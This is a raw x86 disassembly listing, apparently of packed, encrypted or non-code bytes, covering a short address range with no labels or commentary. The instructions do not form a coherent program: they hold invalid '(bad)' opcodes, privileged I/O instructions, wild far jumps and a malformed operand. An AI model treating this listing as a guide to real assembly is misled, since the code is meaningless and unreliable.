  41a6cb:	jg     0x41a71b
  41a6cd:	jmp    0x20a6724b
  41a6d2:	xchg   ebx,eax
  41a6d3:	lock inc ebx
  41a6d5:	sbb    ah,BYTE PTR [esp+eax*4-0x1f70244a]
  41a6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6dd:	sti    
  41a6de:	push   esi
  41a6df:	out    0x8c,eax
  41a6e1:	addr16 mov ch,ah
  41a6e4:	inc    ebx
  41a6e5:	mov    BYTE PTR [ecx-0x41],al
  41a6e8:	dec    esi
  41a6e9:	fisubr DWORD PTR [eax]
  41a6eb:	cwde   
  41a6ec:	jp     0x41a749
  41a6ee:	adc    DWORD PTR [esi+0x5470d6a3],0x9
  41a6f5:	sbb    BYTE PTR [ebp-0x47835843],bl
  41a6fb:	or     al,ah
  41a6fd:	push   esp
  41a6fe:	dec    eax
  41a6ff:	fidiv  WORD PTR [edi+0x29]
  41a702:	hlt    
  41a703:	sub    DWORD PTR [ecx+0x357c890c],ecx
  41a709:	dec    edi
  41a70a:	xor    al,0x4c
  41a70c:	push   0xd8cb679c
  41a711:	retf   
  41a712:	sbb    BYTE PTR [eax],dl
  41a714:	mov    ah,0x3a
  41a716:	jmp    0x41a72c
  41a718:	mov    dh,0xfa
  41a71a:	cmc    
  41a71b:	xchg   DWORD PTR [esi],edi
  41a71d:	ds xchg ebp,eax
  41a71f:	dec    ebp
  41a720:	in     eax,dx
  41a721:	stos   DWORD PTR es:[edi],eax
  41a722:	mov    esp,0x3b7e57f3
  41a727:	outs   dx,BYTE PTR ds:[esi]
  41a728:	addr16 sub eax,0x33a55525
  41a72e:	dec    esp
  41a72f:	pushf  
  41a730:	rcl    BYTE PTR [eax],1
  41a732:	outs   dx,BYTE PTR ds:[esi]
  41a733:	test   eax,0x190c84fe
  41a738:	sbb    DWORD PTR [edx+0x3a],ecx
  41a73b:	leave  
  41a73c:	fwait
  41a73d:	ret    0x320b
  41a740:	sub    BYTE PTR [ecx-0x30],al
  41a743:	arpl   ax,dx
  41a745:	lds    edi,FWORD PTR [ebx+0x47d80797]
  41a74b:	stc    
  41a74c:	push   0xffffffed
  41a74e:	sbb    al,0xfc
  41a750:	mov    esi,0x44fb026c
  41a755:	and    DWORD PTR [edx-0x3270cead],esi
  41a75b:	jnp    0x41a767
  41a75d:	rol    BYTE PTR [edx],cl
  41a75f:	repnz cld 
  41a761:	sbb    DWORD PTR [ebx],edi
  41a763:	scas   al,BYTE PTR es:[edi]
  41a764:	pusha  
  41a765:	faddp  st(6),st
  41a767:	cli    
  41a768:	xor    ebp,DWORD PTR [eax+0x6a]
  41a76b:	dec    esp
  41a76c:	push   ds
  41a76d:	sbb    edi,esi
  41a76f:	pop    ecx
  41a770:	loope  0x41a79c
  41a772:	adc    eax,DWORD PTR [ebx]
  41a774:	aam    0x4c
  41a776:	je     0x41a71f
  41a778:	cmc    
  41a779:	lods   eax,DWORD PTR ds:[esi]
  41a77a:	(bad)  
  41a77b:	adc    eax,0xa62bacd
  41a780:	dec    esp
  41a781:	inc    esi
  41a782:	and    al,0x5b
  41a785:	call   0x36a37427
  41a78a:	add    esi,DWORD PTR [ebp+0x4c]
  41a78d:	cli    
  41a78e:	ds sub eax,0x213372fb
  41a794:	sbb    BYTE PTR [edi],dl
  41a796:	xchg   edx,eax
  41a797:	out    dx,al
  41a798:	(bad)  
  41a799:	in     al,0x94
  41a79b:	jnp    0x41a75d
  41a79d:	xchg   ebx,eax
  41a79e:	or     DWORD PTR [ebp+0x32cdf9c4],edx
  41a7a4:	cmc    
  41a7a5:	inc    edx
  41a7a6:	pop    ebp
  41a7a7:	imul   ebp,DWORD PTR [ebx-0x6ab080ef],0xb41d840c
  41a7b1:	xor    eax,0xf89421dd
  41a7b6:	or     BYTE PTR [esi-0xb],0x6
  41a7ba:	sbb    BYTE PTR [esi+0x268c6a61],al
  41a7c0:	or     BYTE PTR [ecx-0x28],ch
  41a7c3:	sar    BYTE PTR [ebx],1
  41a7c5:	inc    edi
  41a7c6:	jp     0x41a751
  41a7c8:	es push edx
  41a7ca:	loope  0x41a7b8
  41a7cc:	mov    eax,ds:0x9a4ac7cd
  41a7d1:	xchg   eax,edi
  41a7d3:	in     al,0x22
  41a7d5:	push   0x74632774
  41a7da:	sbb    DWORD PTR [esi+0x4e],edx
  41a7dd:	enter  0x25fc,0x2e
  41a7e1:	repnz xchg ecx,eax
  41a7e3:	adc    BYTE PTR [edx+0x46],bh
  41a7e6:	imul   ebp,DWORD PTR [edi+ecx*1+0x3],0xd335a416
  41a7ee:	and    ebp,DWORD PTR [ebp+0x37]
  41a7f1:	pop    edx
  41a7f2:	mov    esp,DWORD PTR [eax+0x5ccc59f3]
  41a7f8:	lea    edx,[edx+0x1]
  41a7fb:	pop    edi
  41a7fc:	in     al,dx
  41a7fd:	cmp    DWORD PTR [ebx-0xb32859e],0xffffffe4
  41a804:	add    DWORD PTR ds:0x4dc8a70a,esi
  41a80a:	cli    
  41a80b:	call   0xdf2a:0x9ab8cb54
  41a812:	frstor [eax-0x1e07ec5e]
  41a818:	popf   
  41a819:	pop    esp
  41a81a:	retf   
  41a81b:	cmp    bl,dh
  41a81d:	imul   eax,DWORD PTR [ebx-0x62],0x59bed309
  41a824:	adc    DWORD PTR [esi-0x3ce379b8],eax
  41a82a:	outs   dx,DWORD PTR ds:[si]
  41a82c:	and    eax,DWORD PTR [eax-0x41]
  41a82f:	push   0xcf51e1b8
  41a834:	pop    esi
  41a835:	cmp    eax,ebp
  41a837:	es iret 
  41a839:	jnp    0x41a803
  41a83b:	mov    ebp,0x1781f089
  41a840:	adc    eax,esp
  41a842:	pusha  
  41a843:	mov    edx,0x9b3d21ca
  41a848:	mov    eax,0xcfcb4116
  41a84d:	daa    
  41a84e:	ret    
  41a84f:	adc    al,0xd3
  41a851:	xchg   ecx,eax
  41a852:	mov    ds:0x287fd6f,eax
  41a857:	loopne 0x41a845
  41a859:	sbb    BYTE PTR [ebp-0x52],dl
  41a85c:	leave  
  41a85d:	(bad)  
  41a85e:	jnp    0x41a810
  41a860:	jle    0x41a85a
  41a862:	push   ebp
  41a863:	mov    ecx,0xd51d5063
  41a868:	and    DWORD PTR [ebx+0x347917c3],esi
  41a86e:	je     0x41a7f0
  41a870:	xor    BYTE PTR [edx],bh
  41a872:	mov    ch,0xb7
  41a874:	and    dh,BYTE PTR [edi+ebx*1-0x41]
  41a878:	or     al,0x7a
  41a87a:	out    dx,al
  41a87b:	pushf  
  41a87c:	xchg   edx,eax
  41a87d:	(bad)  
  41a87e:	aam    0x92
  41a880:	sbb    BYTE PTR [esi],bh
  41a882:	jnp    0x41a846
  41a884:	test   BYTE PTR [ebx],ch
  41a886:	mov    ch,0x42
  41a888:	xchg   ch,cl
  41a88a:	jae    0x41a88f
  41a88c:	ror    ebx,0xfd
  41a88f:	jmp    0x41a86f
  41a891:	retf   0xdfcf
  41a894:	push   ss
  41a895:	add    BYTE PTR [eax],ah
  41a897:	dec    ecx
  41a898:	add    DWORD PTR [ebp+0x22e2349],ebx
  41a89e:	sbb    al,0xbf
  41a8a0:	outs   dx,BYTE PTR ds:[esi]
  41a8a1:	jg     0x41a84e
  41a8a3:	cld    
  41a8a4:	rcr    edx,1
  41a8a6:	lods   al,BYTE PTR ds:[esi]
  41a8a7:	ds cdq 
  41a8a9:	dec    edi
  41a8aa:	pop    ebx
  41a8ab:	pop    ss
  41a8ac:	cmc    
  41a8ad:	cmp    DWORD PTR [eax-0x47],esi
  41a8b0:	iret   
  41a8b1:	sbb    eax,0x1ca3c1ea
  41a8b6:	jno    0x41a894
  41a8b8:	aaa    
  41a8b9:	jb     0x41a876
  41a8bb:	or     eax,0xef610a9
  41a8c0:	mov    ds:0x717b44c9,al
  41a8c5:	nop    DWORD PTR [ecx]
  41a8c8:	push   ds
  41a8c9:	add    ch,BYTE PTR [ecx+0x3e]
  41a8cc:	xchg   edi,eax
  41a8cd:	rol    BYTE PTR [edi+0x2250f3f6],1
  41a8d3:	cmp    BYTE PTR [edx-0x23],al
  41a8d6:	dec    esp
  41a8d7:	(bad)  
  41a8d8:	xchg   esi,eax
  41a8d9:	shl    BYTE PTR [edi+0x7d9ee7d1],0xa4
  41a8e0:	mov    BYTE PTR [ecx-0x6b],ah
  41a8e3:	cs cmp cl,dl
  41a8e6:	aam    0x9
  41a8e8:	loopne 0x41a936
  41a8ea:	fild   DWORD PTR [ebx]
  41a8ec:	xor    BYTE PTR ds:0xfd2b7e52,al
  41a8f2:	aad    0x3e
  41a8f4:	test   ah,dl
  41a8f6:	jae    0x41a89d
  41a8f8:	cmp    ebp,esp
  41a8fa:	pop    esp
  41a8fb:	repz aaa 
  41a8fd:	mov    ecx,0xadaacbcf
  41a902:	cwde   
  41a903:	xchg   BYTE PTR [ebp-0x1f],al
  41a906:	std    
  41a907:	jbe    0x41a8fd
  41a909:	cli    
  41a90a:	jmp    0xbe5721a3
  41a90f:	sar    DWORD PTR [esi+ebx*8],cl
  41a912:	pop    ss
  41a913:	xchg   esi,eax
  41a914:	push   ds
  41a915:	xchg   DWORD PTR [eax+0x4a],ecx
  41a918:	sahf   
  41a919:	popa   
  41a91a:	adc    esp,esp
  41a91c:	scas   eax,DWORD PTR es:[edi]
  41a91d:	xchg   BYTE PTR [ecx-0x1f],dl
  41a920:	add    eax,0xc14a289d
  41a925:	dec    ebx
  41a926:	adc    ah,BYTE PTR [ebp+0x3dedaff1]
  41a92c:	stc    
  41a92d:	sti    
  41a92e:	adc    edi,ebp
  41a930:	and    BYTE PTR [edi-0x79],bl
  41a933:	pop    edi
  41a934:	into   
  41a935:	popf   
  41a936:	imul   eax,DWORD PTR ds:0x7ac4a4a4,0xa9cefa95
  41a940:	icebp  
  41a941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a942:	push   0xe8b11a9d
  41a947:	bound  ebx,QWORD PTR [edx+0x55]
  41a94a:	out    0xc1,eax
  41a94c:	push   ebx
  41a94d:	cmc    
  41a94e:	pop    ebp
  41a94f:	stos   DWORD PTR es:[edi],eax
  41a950:	getsec 
  41a952:	loopne 0x41a99f
  41a954:	aas    
  41a955:	fld    TBYTE PTR [ebx-0x4d]
  41a958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a959:	in     al,dx
  41a95a:	adc    ebp,eax
  41a95c:	ret    
  41a95d:	xor    DWORD PTR [ebp-0x666b34f9],0xa1dcaf6c
  41a967:	jo     0x41a9a2
  41a969:	mov    ss:0xab65c88,eax
  41a96f:	pop    eax
  41a970:	jne    0x41a98d
  41a972:	adc    ebp,ecx
  41a974:	push   esp
  41a975:	ror    BYTE PTR [eax+eiz*2-0xf267dd5],0xea
  41a97d:	push   0xffffff9e
  41a97f:	sbb    dl,BYTE PTR [edx]
  41a981:	or     eax,0xb31a3e57
  41a986:	cdq    
  41a987:	jo     0x41a9b0
  41a989:	pop    es
  41a98a:	cmp    eax,0x25e5d0a1
  41a98f:	cmp    BYTE PTR [esi-0x73014af4],bl
  41a995:	adc    esi,DWORD PTR [ecx+0x4d]
  41a998:	sub    ch,bh
  41a99a:	(bad)  
  41a99b:	in     al,dx
  41a99c:	inc    esi
  41a99d:	push   eax
  41a99e:	fistp  QWORD PTR [edi]
  41a9a0:	xchg   ebp,eax
  41a9a1:	(bad)  
  41a9a2:	cs add al,0x22
  41a9a5:	push   ebp
  41a9a6:	and    dl,0x3d
  41a9a9:	mov    al,ds:0xc25b2836
  41a9ae:	test   al,0xd6
  41a9b0:	(bad)  [eax+eiz*4-0x14f7ccab]
  41a9b7:	push   esp
  41a9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b9:	test   esp,esi
  41a9bb:	xchg   esp,ebp
  41a9bd:	mov    DWORD PTR [edx-0x715d7c5c],ecx
  41a9c3:	or     BYTE PTR [eax+edi*4+0x72],al
  41a9c7:	xlat   BYTE PTR ds:[ebx]
  41a9c8:	mov    edi,0x18d7cc25
  41a9cd:	xlat   BYTE PTR fs:[ebx]
  41a9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d0:	cmp    dh,BYTE PTR [ebx-0x4411e09d]
  41a9d6:	jp     0x41a9b5
  41a9d8:	dec    ecx
  41a9d9:	xlat   BYTE PTR ds:[ebx]
  41a9da:	xchg   DWORD PTR [ecx-0x3f],edx
  41a9dd:	call   0x2fb1:0xd9ec3b4b
  41a9e4:	sub    al,0xd7
  41a9e6:	das    
  41a9e7:	outs   dx,BYTE PTR ds:[esi]
  41a9e8:	push   0xffffffc2
  41a9ea:	pop    esi
  41a9eb:	xlat   BYTE PTR ds:[ebx]
  41a9ec:	in     al,dx
  41a9ed:	nop
  41a9ee:	mov    ds:0x30ce024f,eax
  41a9f3:	xlat   BYTE PTR ds:[ebx]
  41a9f4:	ds inc esp
  41a9f6:	xchg   ebx,eax
  41a9f7:	push   esp
  41a9f8:	sub    BYTE PTR [ecx+0x38],0xd7
  41a9fc:	mov    ds:0x51bb08b9,eax
  41aa01:	inc    ecx
  41aa02:	xor    BYTE PTR [edx-0xe563b35],dl
  41aa08:	(bad)  [edi-0x1688712c]
  41aa0e:	jmp    0x41a998
  41aa10:	and    eax,0xa1b98328
  41aa15:	cmp    bl,cl
  41aa17:	pop    esp
  41aa18:	pop    es
  41aa19:	repnz fst DWORD PTR [esi-0x65]
  41aa1d:	pop    edx
  41aa1e:	imul   ebx,DWORD PTR [ecx+0x15f52ac6],0xd36c3f47
  41aa28:	popa   
  41aa29:	sbb    al,0x73
  41aa2b:	cmp    BYTE PTR [ebp+0x1c],ch
  41aa2e:	inc    esi
  41aa2f:	ja     0x41aa42
  41aa31:	sti    
  41aa32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa34:	inc    ecx
  41aa35:	push   es
  41aa36:	adc    ecx,DWORD PTR [esi+ecx*8+0x4c74441]
  41aa3d:	icebp  
  41aa3e:	jb     0x41aa06
  41aa40:	and    DWORD PTR [eax],edi
  41aa42:	(bad)  
  41aa43:	and    eax,0xc6dd936a
  41aa48:	in     eax,0xcc
  41aa4a:	xor    edi,ebx
  41aa4c:	push   eax
  41aa4d:	out    dx,eax
  41aa4e:	sub    al,0x6f
  41aa50:	sbb    eax,0xaea66a06
  41aa55:	mov    ebp,0x3db107ba
  41aa5a:	or     ebp,ebp
  41aa5c:	inc    ebp
  41aa5d:	fwait
  41aa5e:	push   ebp
  41aa5f:	(bad)  
  41aa60:	lods   al,BYTE PTR ds:[esi]
  41aa61:	scas   eax,DWORD PTR es:[edi]
  41aa62:	push   ebx
  41aa63:	(bad)  
  41aa65:	mov    ds:0x1b984ff,al
  41aa6a:	nop
  41aa6b:	(bad)  
  41aa6c:	dec    ebx
  41aa6d:	or     BYTE PTR [edx+0x2d],cl
  41aa70:	cli    
  41aa71:	test   ebx,esi
  41aa73:	adc    eax,0x4d57780b
  41aa78:	pop    ecx
  41aa79:	std    
  41aa7a:	or     bh,BYTE PTR [ebp-0x1]
  41aa7d:	cmp    al,ch
  41aa7f:	retf   0x5a5b
  41aa82:	cmp    eax,0xb215225d
  41aa87:	mov    ecx,0x1acc2c79
  41aa8c:	cmp    dl,dh
  41aa8e:	dec    ecx
  41aa8f:	dec    esp
  41aa90:	adc    cl,BYTE PTR [edx-0x10e3b59b]
  41aa96:	scas   eax,DWORD PTR es:[edi]
  41aa97:	inc    edi
  41aa98:	addr16 fwait
  41aa9a:	(bad)  
  41aa9b:	xor    edx,DWORD PTR ss:[ebx]
  41aa9e:	mov    dl,dh
  41aaa0:	pop    edi
  41aaa1:	test   bl,0xd9
  41aaa4:	pop    es
  41aaa5:	cli    
  41aaa6:	call   ebx
  41aaa8:	scas   al,BYTE PTR es:[edi]
  41aaa9:	arpl   WORD PTR [edx+0x7fd0e7fb],bp
  41aaaf:	sub    dh,ah
  41aab1:	inc    esp
  41aab2:	shl    BYTE PTR [eax+0x3805ac2e],0xad
  41aab9:	sbb    eax,0x36c24ce9
  41aabe:	scas   eax,DWORD PTR es:[edi]
  41aabf:	push   esp
  41aac0:	inc    ecx
  41aac1:	or     DWORD PTR [edx],ebp
  41aac3:	xchg   esp,eax
  41aac4:	cmp    eax,0xf5570519
  41aac9:	les    edx,FWORD PTR [edi+0x7d233b68]
  41aacf:	sub    edx,esp
  41aad1:	mov    DWORD PTR [eax],edi
  41aad3:	jmp    0x41aabe
  41aad5:	aad    0xcc
  41aad7:	and    ebp,0xd9ce240
  41aadd:	bound  ebp,QWORD PTR [edx-0x7d7e2463]
  41aae3:	push   cs
  41aae4:	and    ecx,eax
  41aae6:	and    bh,BYTE PTR [esi+0x6ec86655]
  41aaec:	and    dh,ch
  41aaee:	sub    eax,esp
  41aaf0:	fwait
  41aaf1:	mov    BYTE PTR [esi+0x38108b79],cl
  41aaf7:	cwde   
  41aaf8:	lods   al,BYTE PTR ds:[esi]
  41aaf9:	push   ebp
  41aafa:	adc    eax,0x19c805fd
  41aaff:	mov    ss,WORD PTR [ecx]
  41ab01:	mov    ds:0x88a0223b,al
  41ab06:	pop    ebx
  41ab07:	or     ebx,DWORD PTR [ecx+0x0]
  41ab0a:	or     BYTE PTR [ebx+0x64],bl
  41ab0d:	fld    TBYTE PTR [ebx+0x7aec407a]
  41ab13:	cli    
  41ab14:	xlat   BYTE PTR ds:[ebx]
  41ab15:	sub    al,bh
  41ab17:	xor    bh,0x87
  41ab1a:	mov    eax,ds:0x597144ec
  41ab1f:	mov    esp,0x476e0b22
  41ab24:	imul   eax,DWORD PTR ds:0xaec3d3a7,0x2437c294
  41ab2e:	test   BYTE PTR [eax],cl
  41ab30:	mov    bh,0x6a
  41ab32:	aad    0x65
  41ab34:	add    DWORD PTR [esi+0x60],edi
  41ab37:	scas   eax,DWORD PTR es:[edi]
  41ab38:	sbb    DWORD PTR [eax-0x7116517c],ebp
  41ab3e:	ret    
  41ab3f:	adc    dh,dl
  41ab41:	retf   0xb502
  41ab44:	push   ds
  41ab45:	int3   
  41ab46:	loope  0x41ab6f
  41ab48:	cmp    eax,0x730699a
  41ab4d:	xor    dl,ch
  41ab4f:	enter  0x68f1,0x62
  41ab53:	sti    
  41ab54:	cmc    
  41ab55:	mov    ds:0xce0d089c,al
  41ab5a:	aad    0x91
  41ab5c:	jg     0x41aadf
  41ab5e:	jmp    0x41abc7
  41ab60:	sar    esp,1
  41ab62:	mov    eax,0x78ecd51e
  41ab67:	jbe    0x41ab0d
  41ab69:	leave  
  41ab6a:	imul   ebp,DWORD PTR [esi+edx*1+0x6b],0xffffffae
  41ab6f:	xchg   ecx,eax
  41ab70:	cld    
  41ab71:	inc    ecx
  41ab72:	mov    al,0xf0
  41ab74:	sub    DWORD PTR [esi+0x35d7d817],0xffffff9b
  41ab7b:	or     ah,0xa9
  41ab7e:	dec    ebp
  41ab7f:	cs push cs
  41ab81:	mov    eax,ds:0xa564c9aa
  41ab86:	dec    edi
  41ab87:	sub    DWORD PTR [ebx],ecx
  41ab89:	dec    ebx
  41ab8a:	in     eax,0x9c
  41ab8c:	push   0x48
  41ab8e:	imul   ebx,DWORD PTR [ebx],0xa84ad461
  41ab94:	adc    DWORD PTR [eax+0x6fee15a9],eax
  41ab9a:	aaa    
  41ab9b:	xor    edx,DWORD PTR [edx]
  41ab9d:	add    bh,BYTE PTR [ecx-0x5e]
  41aba0:	mov    al,0xcf
  41aba2:	sbb    eax,0x5b3d298a
  41aba7:	push   es
  41aba8:	out    dx,al
  41aba9:	test   BYTE PTR [edi-0x7f],0x6c
  41abad:	mov    dl,0xbd
  41abaf:	jae    0x41abf9
  41abb1:	push   edx
  41abb2:	(bad)  
  41abb4:	hlt    
  41abb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb6:	and    DWORD PTR [edi+0x7f],eax
  41abb9:	test   DWORD PTR [eax],ebp
  41abbb:	push   esp
  41abbc:	hlt    
  41abbd:	loop   0x41ac30
  41abbf:	call   0x6ab44d27
  41abc4:	mov    eax,0x4cb19705
  41abc9:	xlat   BYTE PTR ds:[ebx]
  41abca:	dec    edi
  41abcb:	dec    edx
  41abcc:	add    BYTE PTR [edi+edx*8],bh
  41abcf:	cmp    bl,BYTE PTR [esi+0x3f]
  41abd2:	in     al,dx
  41abd3:	leave  
  41abd4:	xor    BYTE PTR [ebp+0x5c],bh
  41abd7:	adc    DWORD PTR [esi],edi
  41abd9:	fst    DWORD PTR [eax-0x64a84578]
  41abdf:	sbb    cl,cl
  41abe1:	int3   
  41abe2:	fs dec eax
  41abe4:	mov    al,0xca
  41abe6:	cld    
  41abe7:	push   ss
  41abe8:	cmp    esp,0x30d9e43c
  41abee:	(bad)  
  41abef:	les    edx,FWORD PTR ds:0x12898de3
  41abf5:	not    BYTE PTR [edi+0x16]
  41abf8:	xchg   DWORD PTR [ebp+0xb],ecx
  41abfb:	outs   dx,BYTE PTR ds:[esi]
  41abfc:	in     al,0x5b
  41abfe:	xor    DWORD PTR [ebp-0x8],edi
  41ac01:	xlat   BYTE PTR ds:[ebx]
  41ac02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac03:	pusha  
  41ac04:	ret    
  41ac05:	hlt    
  41ac06:	jns    0x41ac2a
  41ac08:	test   DWORD PTR [ebx],edx
  41ac0a:	std    
  41ac0b:	sbb    bh,dh
  41ac0d:	rol    DWORD PTR [edi-0x7d],1
  41ac10:	push   es
  41ac11:	sti    
  41ac12:	ins    DWORD PTR es:[edi],dx
  41ac13:	jge    0x41ab9a
  41ac15:	push   ss
  41ac16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac17:	mul    BYTE PTR [ebx]
  41ac19:	jns    0x41ac04
  41ac1b:	mov    ecx,0x766200fb
  41ac20:	push   ss
  41ac21:	scas   eax,DWORD PTR es:[edi]
  41ac22:	xchg   edx,eax
  41ac23:	or     ch,BYTE PTR [edx+edx*2+0x1d]
  41ac27:	(bad)  
  41ac28:	retf   0x4d63
  41ac2b:	mov    cl,0xbf
  41ac2d:	pop    ds
  41ac2e:	adc    bh,BYTE PTR ds:0x1e02d010
  41ac34:	add    DWORD PTR [ecx],0x409571e2
  41ac3a:	sub    dh,0x56
  41ac3d:	jp     0x41abd1
  41ac3f:	iret   
  41ac40:	sub    dl,BYTE PTR [edx]
  41ac42:	pop    ebx
  41ac43:	imul   esp,DWORD PTR [esi+ebp*4-0x88fcc49],0x1633c29
  41ac4e:	adc    ah,dl
  41ac50:	jbe    0x41aca0
  41ac52:	mov    ebp,0x944fe7c7
  41ac57:	aas    
  41ac58:	pop    es
  41ac59:	fld    TBYTE PTR [ebp+0x24]
  41ac5c:	pop    esi
  41ac5d:	jle    0x41acc8
  41ac5f:	xchg   ecx,eax
  41ac60:	std    
  41ac61:	scas   al,BYTE PTR es:[edi]
  41ac62:	aad    0x4e
  41ac64:	mov    dl,0x45
  41ac66:	mov    ah,0xb5
  41ac68:	pop    ds
  41ac69:	jo     0x41ac3a
  41ac6b:	jmp    esp
  41ac6d:	cld    
  41ac6e:	inc    eax
  41ac6f:	lds    esi,FWORD PTR [esi]
  41ac71:	pop    edi
  41ac72:	jb     0x41ac17
  41ac74:	xchg   edi,esi
  41ac76:	test   DWORD PTR [ecx+ebx*4-0x2442eff3],ebx
  41ac7d:	inc    edi
  41ac7e:	inc    esi
  41ac7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac80:	cwde   
  41ac81:	(bad)
  41ac84:	pop    esp
  41ac85:	ds leave 
  41ac87:	add    BYTE PTR [ecx],bl
  41ac89:	(bad)  
  41ac8b:	dec    ecx
  41ac8c:	fs (bad) 
  41ac8e:	sbb    BYTE PTR [edi-0x70a779e2],al
  41ac94:	and    al,0x10
  41ac96:	push   eax
  41ac97:	adc    edx,DWORD PTR [esi]
  41ac99:	xchg   ecx,eax
  41ac9a:	inc    eax
  41ac9b:	or     dx,WORD PTR [ecx-0x67919386]
  41aca2:	pop    esi
  41aca3:	mov    ?,WORD PTR [edi-0x5c0cccd7]
  41aca9:	les    eax,FWORD PTR [ebp-0x79]
  41acac:	popa   
  41acad:	and    ah,BYTE PTR [esi+eiz*4+0x3bac40bc]
  41acb4:	xor    DWORD PTR [eax-0x7a],edx
  41acb7:	jb     0x41aca1
  41acb9:	rcl    BYTE PTR ds:0x78a45646,0xf8
  41acc0:	mov    bh,0x17
  41acc2:	imul   esi,DWORD PTR [ebp+esi*4-0x73],0x2335eb14
  41acca:	push   eax
  41accb:	call   0x8025c69
  41acd0:	psubsb mm1,QWORD PTR [ecx]
  41acd3:	pushf  
  41acd4:	loopne 0x41ad1e
  41acd6:	or     edi,esi
  41acd8:	lock jge 0x41ac5c
  41acdb:	imul   ebx,DWORD PTR [ebx+0x366b26ca],0x57
  41ace2:	add    BYTE PTR [edx-0x71390038],bh
  41ace8:	mov    ebp,0xcca1f7b
  41aced:	outs   dx,DWORD PTR ds:[esi]
  41acee:	in     eax,0xb8
  41acf0:	nop
  41acf1:	jae    0x41ac8e
  41acf3:	and    BYTE PTR [esi-0x51],ah
  41acf6:	or     ebx,ebx
  41acf8:	retf   0x6b38
  41acfb:	adc    eax,0x3734d41e
  41ad00:	push   eax
  41ad01:	xor    BYTE PTR [ecx+edx*8-0x2039bd5f],bh
  41ad08:	jle    0xcc83b486
  41ad0e:	add    eax,0x137e924a
  41ad13:	push   ebx
  41ad14:	jbe    0x41acdf
  41ad16:	repz cwde 
  41ad18:	aad    0x60
  41ad1a:	dec    ebp
  41ad1b:	repz add eax,0x13e900ce
  41ad21:	imul   esi
  41ad23:	stos   DWORD PTR es:[edi],eax
  41ad24:	scas   eax,DWORD PTR es:[edi]
  41ad25:	ret    
  41ad26:	adc    eax,0x3ba7ae66
  41ad2b:	sbb    al,0xab
  41ad2d:	fld    st(6)
  41ad2f:	cli    
  41ad30:	mov    ecx,0x9eb8163a
  41ad35:	aad    0x4
  41ad37:	xchg   esi,eax
  41ad38:	mov    ecx,0x2fa572d8
  41ad3d:	fcomp  DWORD PTR [ebx+0x5cf55b8]
  41ad43:	mov    ebx,0x6e3d2305
  41ad48:	adc    DWORD PTR [eax],ebp
  41ad4a:	inc    esi
  41ad4b:	add    bh,BYTE PTR [edi-0x40]
  41ad4e:	adc    DWORD PTR [esi],ebp
  41ad50:	dec    ebp
  41ad51:	jns    0x41acfa
  41ad53:	pop    ecx
  41ad54:	mov    dh,cl
  41ad56:	pop    ebx
  41ad57:	add    DWORD PTR [esi+0x46d601f3],0xb87d4faa
  41ad61:	and    ah,BYTE PTR [edx]
  41ad63:	js     0x41ad5d
  41ad65:	add    esi,DWORD PTR ds:0x700f2115
  41ad6b:	inc    eax
  41ad6c:	mov    edx,esp
  41ad6e:	lahf   
  41ad6f:	dec    esi
  41ad70:	mov    DWORD PTR [edx],edx
  41ad72:	sbb    al,0x32
  41ad74:	ret    
  41ad75:	jo     0x41ad8e
  41ad77:	and    eax,0x4c5ea180
  41ad7c:	out    dx,al
  41ad7d:	cdq    
  41ad7e:	add    al,0x2b
  41ad80:	fisttp WORD PTR [edx+0xe]
  41ad83:	(bad)  
  41ad84:	retf   0xdea4
  41ad87:	jnp    0x41ad19
  41ad89:	mov    ebp,DWORD PTR [esi]
  41ad8b:	out    dx,eax
  41ad8c:	lock push cs
  41ad8e:	jecxz  0x41ad23
  41ad90:	outs   dx,BYTE PTR ds:[esi]
  41ad91:	pop    ss
  41ad92:	push   esp
  41ad93:	jo     0x41ad9d
  41ad95:	dec    edi
  41ad96:	int    0x7a
  41ad98:	pop    ebp
  41ad99:	pop    esp
  41ad9a:	push   cs
  41ad9b:	xchg   edi,eax
  41ad9c:	pop    ebx
  41ad9d:	jmp    0x37009c79
  41ada2:	cmp    BYTE PTR [eax+0x6ac03901],0x66
  41ada9:	xor    al,0xab
  41adab:	test   eax,0xdb23db1e
  41adb0:	les    eax,FWORD PTR [ecx-0x5d8a242a]
  41adb6:	clc    
  41adb7:	jle    0x41add8
  41adb9:	cs inc edx
  41adbb:	ins    BYTE PTR es:[edi],dx
  41adbc:	jo     0x41ada3
  41adbe:	(bad)  
  41adbf:	dec    ecx
  41adc0:	sahf   
  41adc1:	(bad)  
  41adc2:	out    0x55,eax
  41adc4:	mov    bl,0x85
  41adc6:	xor    al,0xb2
  41adc8:	dec    esp
  41adc9:	pop    edx
  41adca:	cmp    BYTE PTR [esi-0x28],ch
  41adcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adce:	int    0x47
  41add0:	pop    esi
  41add1:	inc    ebp
  41add2:	jmp    0x41ad7b
  41add4:	xchg   edx,eax
  41add5:	xor    edi,DWORD PTR [eax]
  41add7:	mov    ds:0x7df33731,eax
  41addc:	add    BYTE PTR [ecx+0x78],cl
  41addf:	push   ss
  41ade0:	add    esp,DWORD PTR [esi+eiz*1+0x733c64a]
  41ade7:	sub    ch,bh
  41ade9:	stos   BYTE PTR es:[edi],al
  41adea:	arpl   WORD PTR [eax+edi*8+0x2c],si
  41adee:	(bad)  
  41adef:	sub    DWORD PTR [ecx+0x7c01c3f7],eax
  41adf5:	mov    ah,0xf4
  41adf7:	push   ss
  41adf8:	xor    BYTE PTR [ecx-0x1dd3eb5a],ch
  41adfe:	jge    0x41ae42
  41ae00:	jmp    0x41adb5
  41ae02:	add    BYTE PTR [edi-0x7a],dl
  41ae05:	mov    bl,0x97
  41ae07:	bound  edi,QWORD PTR [ebx]
  41ae09:	pop    ebx
  41ae0a:	mov    ds:0xc3c68197,eax
  41ae0f:	sbb    ch,BYTE PTR [ecx+ebx*2]
  41ae12:	inc    eax
  41ae13:	test   edi,ebx
  41ae15:	jecxz  0x41ada7
